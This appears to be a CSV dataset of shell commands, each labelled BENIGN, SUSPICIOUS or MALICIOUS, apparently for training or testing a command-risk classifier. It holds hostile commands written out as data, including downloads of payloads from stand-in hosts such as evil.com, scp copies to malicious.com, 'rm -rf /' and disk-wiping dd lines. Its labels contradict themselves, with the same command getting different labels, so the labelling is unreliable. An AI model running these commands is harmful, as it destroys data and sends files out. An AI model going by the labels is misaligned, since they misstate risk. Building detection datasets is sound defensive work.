command,label
cat /root/.bashrc ,SUSPICIOUS
cat   /etc/shadow,MALICIOUS
wget   http://evil.com/update.bin,MALICIOUS
 cat /etc/passwd,MALICIOUS
curl -O http://fileshare.com/payload.sh,MALICIOUS
cat notes.txt,BENIGN
find / -name 'test',BENIGN
 ls -al,BENIGN
wget http://evil.com/update.bin,MALICIOUS
MKDIR TEST,BENIGN
chmod 777 /root/.bashrc,BENIGN
ls /root/,BENIGN
du -sh,BENIGN
wget http://fileshare.com/update.bin,MALICIOUS
curl -O http://evil.com/exploit.zip,MALICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS
CHMOD 777 /ROOT/.BASHRC,MALICIOUS
df   -h,BENIGN
mkdir   test,BENIGN
curl -O http://suspicious.org/exploit.zip,SUSPICIOUS
ls -al,BENIGN
cd /root/,BENIGN
echo 'pwned' >> /root/.bashrc,BENIGN
 chmod 777 /root/.bashrc,SUSPICIOUS
sudo apt install htop,MALICIOUS
which python,SUSPICIOUS
ssh -L 8080:target.com:80 attacker@remote,MALICIOUS
curl https://suspicious.org/payload.sh,MALICIOUS
rm -rf   /* --no-preserve-root,MALICIOUS
cat /var/log/auth.log,SUSPICIOUS
LS   /ROOT/,SUSPICIOUS
sudo   su,SUSPICIOUS
echo   'hello world',BENIGN
cat /etc/shadow,MALICIOUS
ECHO   'PWNED' > /ROOT/.BASHRC,MALICIOUS
scp data.tar.gz user@malicious.com:/root/ ,MALICIOUS
curl -O http://evil.com/payload.sh,SUSPICIOUS
 du -sh,BENIGN
cd /tmp/ ,SUSPICIOUS
cat /var/log/syslog,BENIGN
rm -rf /,SUSPICIOUS
 wget http://evil.com/exploit.zip,BENIGN
echo 'hacked' >> /etc/shadow,BENIGN
WGET HTTP://EVIL.COM/PAYLOAD.SH ,MALICIOUS
ping   google.com,BENIGN
echo 'owned' > /root/.bashrc,BENIGN
du   -sh,BENIGN
echo   'hacked' > /root/.bashrc,MALICIOUS
cd /root,SUSPICIOUS
cat homework.txt ,BENIGN
echo 'hacked' > /var/log/syslog,SUSPICIOUS
PING GOOGLE.COM ,BENIGN
curl https://evil.com/update.bin,SUSPICIOUS
 echo 'hello world',BENIGN
curl   http://unknown.site/script.sh,SUSPICIOUS
 curl https://safe-site.org/update.sh,BENIGN
ifconfig ,BENIGN
 wget http://malicious.com/payload.sh,MALICIOUS
CAT /VAR/LOG/AUTH.LOG,SUSPICIOUS
grep 'password' /etc/passwd ,MALICIOUS
IPTABLES -F,MALICIOUS
scp file.txt user@malicious.com:/tmp/,SUSPICIOUS
echo 'owned' >> /root/.bashrc,SUSPICIOUS
which   python,SUSPICIOUS
curl http://unknown.site/script.sh ,SUSPICIOUS
sudo su ,SUSPICIOUS
 DF -H,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS
PS AUX   | GREP SSHD,SUSPICIOUS
echo 'hacked' > /etc/shadow,MALICIOUS
scp file.txt   attacker@remote:/tmp/,MALICIOUS
ps aux | grep mysql,SUSPICIOUS
scp   data.tar.gz root@192.168.0.2:/var/www,BENIGN
WGET HTTP://FILESHARE.COM/PAYLOAD.SH,BENIGN
CAT /ROOT/.BASHRC ,SUSPICIOUS
sudo apt update,BENIGN
cat   homework.txt,BENIGN
sudo apt install   net-tools,SUSPICIOUS
grep   root /etc/passwd,SUSPICIOUS
 curl -O http://evil.com/update.bin,BENIGN
touch homework.doc,BENIGN
dd if=/dev/zero of=/dev/sda ,MALICIOUS
cat   /etc/passwd,MALICIOUS
echo 'pwned' >> /etc/shadow,SUSPICIOUS
curl -O http://fileshare.com/exploit.zip,SUSPICIOUS
top -n   1,BENIGN
CAT   WELCOME.TXT,BENIGN
 ls /tmp/,SUSPICIOUS
scp   data.tar.gz user@192.168.0.2:/root/,MALICIOUS
curl -O   http://evil.com/exploit.zip,BENIGN
ECHO 'OWNED' >   /VAR/LOG/SYSLOG,SUSPICIOUS
 ECHO 'OWNED' >> /ROOT/.BASHRC,MALICIOUS
 echo 'hacked' > /var/log/syslog,SUSPICIOUS
LS   /TMP/,MALICIOUS
 ps aux | grep sshd,SUSPICIOUS
 LS /ROOT/,SUSPICIOUS
CD   /ROOT,SUSPICIOUS
echo 'malware'   > /tmp/malware.sh,MALICIOUS
FIND / -NAME 'TEST',BENIGN
wget http://evil.com/exploit.zip,SUSPICIOUS
curl https://evil.com/exploit.zip,BENIGN
TOP -N 1,BENIGN
scp data.tar.gz admin@192.168.0.2:/tmp/,BENIGN
PS AUX | GREP NGINX,SUSPICIOUS
scp data.tar.gz   admin@192.168.0.2:/var/www,SUSPICIOUS
 which python,SUSPICIOUS
echo 'pwned' > /root/.bashrc,MALICIOUS
cd /root ,SUSPICIOUS
touch   homework.doc,BENIGN
iptables -F ,MALICIOUS
cd   /tmp/,MALICIOUS
curl https://evil.com/payload.sh,MALICIOUS
CAT NOTES.TXT ,BENIGN
 sudo apt install htop,MALICIOUS
echo 'pwned' >> /etc/shadow ,BENIGN
 env,SUSPICIOUS
echo   'owned' > /etc/shadow,BENIGN
echo 'pwned' > /var/log/syslog,SUSPICIOUS
 watch netstat -an,SUSPICIOUS
cat ~/.ssh/known_hosts ,SUSPICIOUS
LS -AL ,BENIGN
echo 'pwned'   >> /var/log/syslog,MALICIOUS
mkdir test,BENIGN
cd   /root/,SUSPICIOUS
grep root /etc/passwd ,SUSPICIOUS
PS   AUX,SUSPICIOUS
rm -rf /*   --no-preserve-root,MALICIOUS
ECHO 'OWNED' > /ROOT/.BASHRC,MALICIOUS
whoami,BENIGN
chmod   777 /var/log/syslog,BENIGN
echo 'hacked' >> /root/.bashrc,SUSPICIOUS
cat /var/log/syslog ,SUSPICIOUS
scp data.tar.gz   user@malicious.com:/root/,SUSPICIOUS
LS /ROOT/,SUSPICIOUS
curl https://suspicious.org/exploit.zip,BENIGN
scp file.txt root@malicious.com:/tmp/,MALICIOUS
scp backup.sql root@malicious.com:/var/www,BENIGN
 netstat -tulnp,SUSPICIOUS
 PS AUX | GREP MYSQL,MALICIOUS
echo 'pwned' > /root/.bashrc ,BENIGN
ECHO 'OWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS
curl -O http://suspicious.org/payload.sh,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/var/www,MALICIOUS
echo 'hello world' ,BENIGN
echo 'owned' >> /var/log/syslog,SUSPICIOUS
ssh -L 8080:target.com:80   attacker@remote,MALICIOUS
scp data.tar.gz root@192.168.0.2:/tmp/,SUSPICIOUS
echo   'owned' >> /root/.bashrc,SUSPICIOUS
cat   notes.txt,BENIGN
 cat readme.md,BENIGN
SUDO APT INSTALL HTOP ,BENIGN
ps aux |   grep mysql,BENIGN
echo 'owned' >> /etc/shadow,MALICIOUS
mkdir test ,BENIGN
cat   /home/user/todo.txt,BENIGN
SUDO -L,SUSPICIOUS
watch   netstat -an,SUSPICIOUS
grep 'password' /etc/passwd,MALICIOUS
 iptables -F,MALICIOUS
 TOP -N 1,BENIGN
echo 'pwned' > /etc/shadow,SUSPICIOUS
watch netstat -an,SUSPICIOUS
 ECHO 'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
echo 'pwned' >> /var/log/syslog,SUSPICIOUS
cat   .bashrc,BENIGN
uname   -a,SUSPICIOUS
curl https://suspicious.org/update.bin,BENIGN
CAT   /ROOT/.BASHRC,SUSPICIOUS
grep root   /etc/passwd,SUSPICIOUS
scp file.txt user@backup.server:/root/,SUSPICIOUS
cat   /home/user/info.txt,BENIGN
 cd /tmp/,SUSPICIOUS
ps aux | grep nginx ,BENIGN
cat   /var/log/syslog,MALICIOUS
 echo 'owned' >> /var/log/syslog,SUSPICIOUS
 cat /root/.bashrc,SUSPICIOUS
sudo apt install nmap,MALICIOUS
rm   -rf /,MALICIOUS
ls /root/ ,SUSPICIOUS
 sudo apt install net-tools,SUSPICIOUS
scp file.txt root@192.168.0.2:/var/www,MALICIOUS
GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS
history ,SUSPICIOUS
curl https://suspicious.org/payload.sh ,BENIGN
CAT /ROOT/.BASHRC,MALICIOUS
echo 'owned' > /var/log/syslog,MALICIOUS
CAT   .BASHRC,BENIGN
CAT /ETC/SHADOW,SUSPICIOUS
 grep 'password' /etc/passwd,MALICIOUS
curl   https://fileshare.com/update.bin,SUSPICIOUS
 echo 'pwned' >> /root/.bashrc,MALICIOUS
 df -h,BENIGN
WGET   HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
 curl https://evil.com/payload.sh,BENIGN
IFCONFIG,BENIGN
 whoami,BENIGN
scp data.tar.gz user@backup.server:/root/,SUSPICIOUS
rm -rf /home/user ,BENIGN
curl -o   http://fileshare.com/exploit.zip,BENIGN
HISTORY,SUSPICIOUS
cat /var/log/auth.log ,SUSPICIOUS
 CAT /ROOT/.BASHRC,SUSPICIOUS
scp data.tar.gz root@backup.server:/var/www,SUSPICIOUS
mv   /bin/bash /tmp/bash,MALICIOUS
RM -RF /,MALICIOUS
ENV ,SUSPICIOUS
find   / -name 'test',BENIGN
watch netstat   -an,SUSPICIOUS
wget   http://malicious.com/payload.sh,MALICIOUS
echo 'pwned' >   /etc/shadow,BENIGN
scp data.tar.gz root@backup.server:/tmp/,BENIGN
 cat /var/log/auth.log,SUSPICIOUS
scp   file.txt user@malicious.com:/var/www,MALICIOUS
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
curl https://safe-site.org/update.sh ,BENIGN
SUDO   -L,SUSPICIOUS
curl   https://fileshare.com/payload.sh,SUSPICIOUS
GREP ROOT /ETC/PASSWD,SUSPICIOUS
echo 'pwned'   >> /etc/shadow,MALICIOUS
cat .bashrc ,BENIGN
echo 'hello   world',BENIGN
curl   -O http://malicious.com/malware.bin,MALICIOUS
echo 'owned' >> /root/.bashrc ,MALICIOUS
CAT /HOME/USER/INFO.TXT,BENIGN
chmod   777 /etc/shadow,MALICIOUS
curl   -o http://evil.com/payload.sh,BENIGN
 find / -name 'test',BENIGN
wget   http://suspicious.org/update.bin,MALICIOUS
 cat /home/user/todo.txt,BENIGN
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
 ping google.com,BENIGN
cat   readme.md,BENIGN
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
wget http://fileshare.com/payload.sh,MALICIOUS
ECHO 'HELLO',BENIGN
CAT   /VAR/LOG/SYSLOG,SUSPICIOUS
PS AUX | GREP SSHD,MALICIOUS
 scp backup.sql user@malicious.com:/root/,MALICIOUS
PS AUX | GREP MYSQL,MALICIOUS
curl   https://suspicious.org/update.bin,BENIGN
scp data.tar.gz user@malicious.com:/root/,SUSPICIOUS
echo 'hacked' > /root/.bashrc ,MALICIOUS
CD   /VAR/WWW,SUSPICIOUS
ls   /root/,BENIGN
CD /VAR/WWW,BENIGN
ssh -l 8080:target.com:80 attacker@remote,MALICIOUS
ls   -al,BENIGN
scp backup.sql admin@backup.server:/tmp/,MALICIOUS
curl   https://fileshare.com/exploit.zip,BENIGN
sudo   apt update,BENIGN
chmod 777   /etc/shadow,MALICIOUS
CAT   /ETC/SHADOW,SUSPICIOUS
rm -rf   /,MALICIOUS
ssh -l 8080:target.com:80 attacker@remote ,MALICIOUS
sudo -l ,SUSPICIOUS
SCP DATA.TAR.GZ   USER@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
scp backup.sql   admin@192.168.0.2:/var/www,MALICIOUS
CURL   -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS
ls -al ,BENIGN
 sudo apt update,BENIGN
curl -o http://suspicious.org/exploit.zip,SUSPICIOUS
FIND / -NAME 'TEST' ,BENIGN
PWD,BENIGN
 cat .bashrc,BENIGN
ECHO 'PWNED' > /ROOT/.BASHRC,BENIGN
 cat /var/log/syslog,SUSPICIOUS
cat   ~/.ssh/known_hosts,SUSPICIOUS
CHMOD 777   /ETC/SHADOW,MALICIOUS
cat   /var/log/auth.log,SUSPICIOUS
 cd /var/www,BENIGN
rm   -rf /home/user,BENIGN
cat /home/user/info.txt ,BENIGN
WGET HTTP://EVIL.COM/UPDATE.BIN ,SUSPICIOUS
 rm -rf /,MALICIOUS
curl -O   http://evil.com/payload.sh,SUSPICIOUS
 cat homework.txt,BENIGN
scp backup.sql admin@malicious.com:/tmp/,BENIGN
CAT /VAR/LOG/SYSLOG,SUSPICIOUS
 ls /var/www,SUSPICIOUS
CURL   HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
echo 'pwned' > /etc/shadow ,MALICIOUS
 cd /root,SUSPICIOUS
curl -o http://malicious.com/malware.bin,MALICIOUS
echo 'owned' > /var/log/syslog ,SUSPICIOUS
iptables   -F,MALICIOUS
 echo 'malware' > /tmp/malware.sh,MALICIOUS
iptables -f,MALICIOUS
curl -o http://fileshare.com/exploit.zip,SUSPICIOUS
curl https://fileshare.com/update.bin,BENIGN
top   -n 1,BENIGN
CHMOD   777 /ETC/SHADOW,MALICIOUS
ECHO   'MALWARE' > /TMP/MALWARE.SH,MALICIOUS
 ls /root/,SUSPICIOUS
 scp file.txt root@backup.server:/tmp/,SUSPICIOUS
CHMOD 777 /ETC/SHADOW,MALICIOUS
curl -O   http://malicious.com/malware.bin,MALICIOUS
CURL   HTTPS://EVIL.COM/UPDATE.BIN,SUSPICIOUS
curl -O http://fileshare.com/update.bin ,SUSPICIOUS
CAT /VAR/LOG/SYSLOG ,SUSPICIOUS
iptables   -f,MALICIOUS
TOUCH HOMEWORK.DOC,BENIGN
 pwd,BENIGN
ECHO 'OWNED' > /VAR/LOG/SYSLOG,MALICIOUS
scp backup.sql user@192.168.0.2:/root/,MALICIOUS
wget http://evil.com/payload.sh,MALICIOUS
wget   http://fileshare.com/payload.sh,SUSPICIOUS
SUDO APT INSTALL   HTOP,BENIGN
CHMOD 777   /VAR/LOG/SYSLOG,MALICIOUS
 ps aux,SUSPICIOUS
CD /ROOT,SUSPICIOUS
cat /etc/shadow ,MALICIOUS
wget http://fileshare.com/exploit.zip,MALICIOUS
 cat welcome.txt,BENIGN
 grep root /etc/passwd,SUSPICIOUS
WATCH NETSTAT   -AN,SUSPICIOUS
rm -rf /* --no-preserve-root ,MALICIOUS
DF   -H,BENIGN
 DD IF=/DEV/ZERO OF=/DEV/SDA,MALICIOUS
echo 'hacked'   >> /etc/shadow,BENIGN
scp data.tar.gz user@backup.server:/var/www,SUSPICIOUS
curl -o http://malicious.com/malware.bin ,MALICIOUS
 CD /TMP/,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
ps aux   | grep sshd,BENIGN
scp file.txt user@malicious.com:/root/,MALICIOUS
scp data.tar.gz user@192.168.0.2:/tmp/,SUSPICIOUS
curl   -O http://evil.com/exploit.zip,SUSPICIOUS
sudo apt   install nmap,MALICIOUS
 CAT /VAR/LOG/AUTH.LOG,SUSPICIOUS
WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
scp file.txt attacker@remote:/tmp/ ,MALICIOUS
LS /VAR/WWW,SUSPICIOUS
 PING GOOGLE.COM,BENIGN
 cd /root/,SUSPICIOUS
echo 'malware' > /tmp/malware.sh ,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/var/www,BENIGN
wget http://evil.com/update.bin ,BENIGN
 cat ~/.ssh/known_hosts,SUSPICIOUS
find / -name   'test',BENIGN
env ,SUSPICIOUS
echo 'hacked'   > /root/.bashrc,MALICIOUS
 mv /bin/bash /tmp/bash,MALICIOUS
 WGET HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS
 CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
scp backup.sql   user@malicious.com:/tmp/,MALICIOUS
curl   https://safe-site.org/update.sh,BENIGN
 rm -rf /* --no-preserve-root,MALICIOUS
ECHO   'HACKED' >> /ETC/SHADOW,SUSPICIOUS
SCP FILE.TXT ATTACKER@REMOTE:/TMP/ ,MALICIOUS
 rm -rf /home/user,MALICIOUS
cd   /root,SUSPICIOUS
WGET   HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
RM -RF /HOME/USER,SUSPICIOUS
ping google.com ,BENIGN
 curl -o http://fileshare.com/exploit.zip,SUSPICIOUS
netstat   -tulnp,SUSPICIOUS
TOP   -N 1,BENIGN
curl https://suspicious.org/exploit.zip ,SUSPICIOUS
 ECHO 'OWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
echo 'pwned'   > /var/log/syslog,BENIGN
echo 'pwned' > /var/log/syslog ,MALICIOUS
CAT README.MD,BENIGN
DF -H ,BENIGN
CURL   HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
dd if=/dev/zero   of=/dev/sda,MALICIOUS
curl   https://suspicious.org/payload.sh,SUSPICIOUS
scp backup.sql user@192.168.0.2:/var/www,MALICIOUS
 scp file.txt user@192.168.0.2:/tmp/,MALICIOUS
 UNAME -A,SUSPICIOUS
curl   -O http://evil.com/update.bin,SUSPICIOUS
scp file.txt admin@192.168.0.2:/root/,SUSPICIOUS
 ps aux | grep mysql,BENIGN
sudo   -l,SUSPICIOUS
curl   -O http://fileshare.com/payload.sh,BENIGN
rm -rf / ,MALICIOUS
CAT   NOTES.TXT,BENIGN
cd   /var/www,SUSPICIOUS
scp backup.sql admin@malicious.com:/var/www,BENIGN
FIND /   -NAME 'TEST',BENIGN
RM   -RF /,MALICIOUS
watch netstat -an ,SUSPICIOUS
curl -O http://malicious.com/malware.bin ,MALICIOUS
ls   /tmp/,SUSPICIOUS
scp   file.txt user@backup.server:/tmp/,MALICIOUS
top -n 1 ,BENIGN
mv /bin/bash   /tmp/bash,MALICIOUS
curl -O http://evil.com/update.bin,BENIGN
sudo apt   install net-tools,MALICIOUS
scp   file.txt attacker@remote:/tmp/,MALICIOUS
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE ,MALICIOUS
SSH -L 8080:TARGET.COM:80   ATTACKER@REMOTE,MALICIOUS
echo   'malware' > /tmp/malware.sh,MALICIOUS
curl -o http://evil.com/payload.sh,BENIGN
 RM -RF /,SUSPICIOUS
curl -o   http://evil.com/payload.sh,SUSPICIOUS
ECHO 'HACKED'   >> /ROOT/.BASHRC,BENIGN
grep 'password'   /etc/passwd,MALICIOUS
scp file.txt user@192.168.0.2:/var/www,SUSPICIOUS
RM -RF /VAR/,MALICIOUS
SUDO APT   INSTALL NMAP,BENIGN
CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
WHICH PYTHON,SUSPICIOUS
chmod 777   /root/.bashrc,SUSPICIOUS
 curl https://suspicious.org/exploit.zip,MALICIOUS
scp file.txt admin@192.168.0.2:/tmp/,BENIGN
scp   data.tar.gz root@malicious.com:/var/www,SUSPICIOUS
find /   -name 'test',BENIGN
LS /TMP/,SUSPICIOUS
cat /home/user/todo.txt ,BENIGN
DU   -SH,BENIGN
ECHO 'HACKED' > /VAR/LOG/SYSLOG,SUSPICIOUS
RM -RF /* --NO-PRESERVE-ROOT ,MALICIOUS
 ENV,SUSPICIOUS
DU -SH,BENIGN
rm   -rf /var/,BENIGN
 echo 'pwned' >> /etc/shadow,SUSPICIOUS
 IPTABLES -F,MALICIOUS
 ps aux | grep nginx,SUSPICIOUS
 wget http://suspicious.org/exploit.zip,BENIGN
sudo   apt install net-tools,BENIGN
CURL   HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
CAT   /HOME/USER/TODO.TXT,BENIGN
RM -RF   /HOME/USER,SUSPICIOUS
echo 'hacked' >   /root/.bashrc,MALICIOUS
CD   /ROOT/,BENIGN
touch homework.doc ,BENIGN
 scp file.txt attacker@remote:/tmp/,MALICIOUS
 CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
echo 'malware' >   /tmp/malware.sh,MALICIOUS
MKDIR   TEST,BENIGN
sudo apt update ,BENIGN
 SUDO -L,SUSPICIOUS
grep   'password' /etc/passwd,MALICIOUS
CAT WELCOME.TXT,BENIGN
df -h ,BENIGN
rm   -rf /* --no-preserve-root,MALICIOUS
ssh -L   8080:target.com:80 attacker@remote,MALICIOUS
 ifconfig,BENIGN
wget   http://fileshare.com/exploit.zip,SUSPICIOUS
WGET HTTP://EVIL.COM/PAYLOAD.SH,BENIGN
ECHO   'OWNED' >> /VAR/LOG/SYSLOG,BENIGN
chmod 777   /var/log/syslog,MALICIOUS
echo 'hacked' >>   /var/log/syslog,SUSPICIOUS
CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS
echo 'owned' >   /etc/shadow,SUSPICIOUS
cat readme.md ,BENIGN
pwd ,BENIGN
echo 'hacked'   >> /root/.bashrc,BENIGN
sudo apt   update,BENIGN
ECHO   'HELLO WORLD',BENIGN
PING GOOGLE.COM,BENIGN
ECHO 'MALWARE'   > /TMP/MALWARE.SH,MALICIOUS
sudo apt install   htop,MALICIOUS
ECHO 'OWNED' >> /ROOT/.BASHRC,SUSPICIOUS
curl   https://evil.com/update.bin,MALICIOUS
WHICH   PYTHON,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/tmp/,MALICIOUS
curl https://fileshare.com/payload.sh,SUSPICIOUS
CAT .BASHRC,BENIGN
CAT   README.MD,BENIGN
NETSTAT -TULNP ,SUSPICIOUS
SUDO APT INSTALL NET-TOOLS,SUSPICIOUS
RM -RF / ,MALICIOUS
curl -O http://evil.com/update.bin ,BENIGN
scp file.txt root@malicious.com:/root/,BENIGN
scp data.tar.gz user@malicious.com:/var/www,SUSPICIOUS
 scp backup.sql admin@192.168.0.2:/root/,BENIGN
ps aux | grep   sshd,SUSPICIOUS
 curl https://fileshare.com/update.bin,BENIGN
ECHO   'HELLO',BENIGN
SCP DATA.TAR.GZ USER@192.168.0.2:/VAR/WWW,BENIGN
SUDO   SU,SUSPICIOUS
curl -O   http://fileshare.com/update.bin,MALICIOUS
scp data.tar.gz admin@malicious.com:/root/,SUSPICIOUS
scp   backup.sql admin@malicious.com:/var/www,SUSPICIOUS
echo 'pwned' >   /var/log/syslog,SUSPICIOUS
CURL HTTPS://EVIL.COM/UPDATE.BIN,MALICIOUS
scp file.txt   admin@malicious.com:/var/www,SUSPICIOUS
 CAT /HOME/USER/TODO.TXT,BENIGN
scp file.txt admin@192.168.0.2:/var/www,SUSPICIOUS
curl -O   http://evil.com/update.bin,SUSPICIOUS
CURL HTTPS://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
wget http://fileshare.com/payload.sh ,BENIGN
scp data.tar.gz root@malicious.com:/tmp/ ,MALICIOUS
 sudo apt install nmap,BENIGN
CURL -O HTTP://EVIL.COM/UPDATE.BIN ,BENIGN
LS /ROOT/ ,SUSPICIOUS
ps aux | grep   mysql,MALICIOUS
DU -SH ,BENIGN
ls /tmp/ ,BENIGN
 curl http://unknown.site/script.sh,SUSPICIOUS
curl   -O http://evil.com/payload.sh,BENIGN
 curl https://fileshare.com/exploit.zip,MALICIOUS
SCP   FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS
CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
 ECHO 'HELLO WORLD',BENIGN
 uname -a,SUSPICIOUS
WGET HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
CAT   HOMEWORK.TXT,BENIGN
 cat /etc/shadow,MALICIOUS
whoami ,BENIGN
scp backup.sql admin@192.168.0.2:/root/,BENIGN
CD   /TMP/,MALICIOUS
cd /var/www ,SUSPICIOUS
NETSTAT -TULNP,SUSPICIOUS
scp file.txt root@malicious.com:/var/www,SUSPICIOUS
 chmod 777 /etc/shadow,MALICIOUS
scp backup.sql root@backup.server:/tmp/,BENIGN
 echo 'owned' > /root/.bashrc,SUSPICIOUS
CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
ECHO 'HACKED' > /ROOT/.BASHRC ,MALICIOUS
scp file.txt user@backup.server:/var/www,MALICIOUS
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,SUSPICIOUS
LS -AL,BENIGN
SUDO APT INSTALL HTOP,SUSPICIOUS
cd /root/ ,SUSPICIOUS
PS AUX,SUSPICIOUS
chmod   777 /root/.bashrc,SUSPICIOUS
CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
CAT   /HOME/USER/INFO.TXT,BENIGN
WGET   HTTP://FILESHARE.COM/UPDATE.BIN,BENIGN
